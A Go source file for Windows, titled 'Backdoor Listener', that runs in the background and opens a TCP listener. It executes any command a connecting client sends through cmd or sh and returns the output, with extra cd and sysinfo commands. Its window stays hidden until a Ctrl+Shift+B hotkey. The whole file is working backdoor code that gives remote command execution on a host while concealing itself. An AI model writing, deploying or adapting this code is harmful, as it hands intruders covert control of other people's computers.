//go:build windows

package main

import (
	"bufio"
	"context"
	"encoding/json"
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"sync"
	"time"

	"github.com/lxn/walk"
	. "github.com/lxn/walk/declarative"
	"github.com/micmonay/keybd_event"
)

const (
	HOST = "127.0.0.1"
	PORT = "12345"
	TYPE = "tcp"
)

var (
	listenerConn      net.Conn
	mainWindow        *walk.MainWindow
	addressLineEdit   *walk.LineEdit
	portLineEdit      *walk.LineEdit
	connectButton     *walk.PushButton
	logTextEdit       *walk.TextEdit
	stopListener      chan struct{}
	startListenerOnce sync.Once
	kb                keybd_event.KeyBonding
	uiVisible         bool
	uiMutexLocal      sync.Mutex
)

type Config struct {
	Host string `json:"host"`
	Port string `json:"port"`
}

func loadConfig() Config {
	config := Config{Host: HOST, Port: PORT}
	data, err := os.ReadFile("config.json")
	if err == nil {
		err = json.Unmarshal(data, &config)
		if err != nil {
			log.Println("Error unmarshalling config:", err)
		}
	}
	return config
}

func saveConfig(config Config) {
	data, err := json.MarshalIndent(config, "", "  ")
	if err != nil {
		log.Println("Error marshalling config:", err)
		return
	}
	err = os.WriteFile("config.json", data, 0644)
	if err != nil {
		log.Println("Error saving config:", err)
	}
}

func executeCommand(command string) string {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/C", command)
	} else {
		cmd = exec.Command("sh", "-c", command)
	}
	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Sprintf("Error executing command: %v\n%s", err, string(output))
	}
	return string(output)
}

func changeDirectory(path string) string {
	err := os.Chdir(path)
	if err != nil {
		return fmt.Sprintf("Error changing directory: %v", err)
	}
	wd, _ := os.Getwd()
	return fmt.Sprintf("Changed directory to: %s", wd)
}

func getSysInfo() string {
	osName := runtime.GOOS
	arch := runtime.GOARCH
	hostname, _ := os.Hostname()
	username := "N/A"
	return fmt.Sprintf("OS: %s\nArchitecture: %s\nHostname: %s\nUsername: %s", osName, arch, hostname, username)
}

func handleConnection(conn net.Conn) {
	defer conn.Close()
	reader := bufio.NewReader(conn)
	writer := bufio.NewWriter(conn)
	logMessage(fmt.Sprintf("Client connected: %s", conn.RemoteAddr()))

	for {
		command, _ := reader.ReadString('\n')
		command = strings.TrimSpace(command)
		if command == "quit" {
			break
		}
		var result string
		if strings.HasPrefix(command, "cd ") {
			path := strings.TrimSpace(command[3:])
			result = changeDirectory(path)
		} else if command == "sysinfo" {
			result = getSysInfo()
		} else if command != "" {
			result = executeCommand(command)
		}
		_, err := writer.WriteString(result + "\n")
		writer.Flush()
		if err != nil {
			logMessage(fmt.Sprintf("Error sending response: %v", err))
			break
		}
	}
	logMessage(fmt.Sprintf("Client disconnected: %s", conn.RemoteAddr()))
}

func startListenerService(host, port string) {
	ln, err := net.Listen(TYPE, host+":"+port)
	if err != nil {
		logMessage(fmt.Sprintf("Error listening: %v", err))
		return
	}
	defer ln.Close()
	logMessage(fmt.Sprintf("Listening on %s:%s", host, port))

	for {
		conn, err := ln.Accept()
		if err != nil {
			select {
			case <-stopListener:
				logMessage("Listener stopped.")
				return
			default:
				logMessage(fmt.Sprintf("Error accepting connection: %v", err))
				continue
			}
		}
		go handleConnection(conn)
	}
}

func startListener(host, port string) {
	startListenerOnce.Do(func() {
		stopListener = make(chan struct{})
		go startListenerService(host, port)
		logMessage("Listener service started in the background.")
	})
}

func stopListenerService() {
	if stopListener != nil {
		close(stopListener)
		listenerConn = nil
		logMessage("Stopping listener service...")
		startListenerOnce = sync.Once{}
	} else {
		logMessage("Listener service is not running.")
	}
}

func connectButtonHandler() {
	host := addressLineEdit.Text()
	port := portLineEdit.Text()
	config := Config{Host: host, Port: port}
	saveConfig(config)
	startListener(host, port)
}

func logMessage(message string) {
	if mainWindow != nil {
		mainWindow.Synchronize(func() {
			if logTextEdit != nil {
				logTextEdit.AppendText(fmt.Sprintf("[%s] %s\r\n", time.Now().Format("2006-01-02 15:04:05"), message))
			}
		})
	}
	log.Println(message)
}

func createUIWrapper(config Config) {
	err := MainWindow{
		Title:   "Backdoor Listener",
		MinSize: Size{Width: 300, Height: 200},
		Layout:  VBox{},
		Children: []Widget{
			Composite{
				Layout: Grid{Columns: 2},
				Children: []Widget{
					Label{Text: "Listen Address:"},
					LineEdit{AssignTo: &addressLineEdit, Text: config.Host},
					Label{Text: "Listen Port:"},
					LineEdit{AssignTo: &portLineEdit, Text: config.Port},
				},
			},
			PushButton{
				Text:      "Start Listener",
				AssignTo:  &connectButton,
				OnClicked: func() { connectButtonHandler() },
			},
			Label{Text: "Log:"},
			TextEdit{
				AssignTo:     &logTextEdit,
				ReadOnly:     true,
				VScroll:      true,
				CompactHeight: false,
			},
		},
		Events: Events{
			Closing: func(canceled *bool, reason CloseReason) {
				stopListenerService()
				uiVisible = false
				mainWindow = nil
			},
		},
		AssignTo: &mainWindow,
	}.Create()

	if err != nil {
		log.Fatal("UI creation failed:", err)
	}

	mainWindow.Show()
	mainWindow.Run()
}

func main() {
	if runtime.GOOS != "windows" {
		fmt.Println("Walk is a Windows-specific GUI library. Please run this on Windows.")
		return
	}

	var err error
	kb, err = keybd_event.NewKeyBonding()
	if err != nil {
		log.Fatal("Error creating keybd instance:", err)
	}

	config := loadConfig()

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	go func() {
		for {
			select {
			case <-ctx.Done():
				return
			default:
				if kb.IsPressed(keybd_event.VK_CONTROL) &&
					kb.IsPressed(keybd_event.VK_SHIFT) &&
					kb.IsPressed(keybd_event.VK_B) {
					uiMutexLocal.Lock()
					if !uiVisible {
						uiVisible = true
						go createUIWrapper(config)
					} else if mainWindow != nil {
						mainWindow.Synchronize(func() {
							mainWindow.Show()
						})
					}
					uiMutexLocal.Unlock()
					time.Sleep(time.Millisecond * 500)
				}
				time.Sleep(time.Millisecond * 100)
			}
		}
	}()

	log.Println("Backdoor listener running in the background. Press Ctrl+Shift+B to open UI.")
	startListener(config.Host, config.Port)
	select {}
}
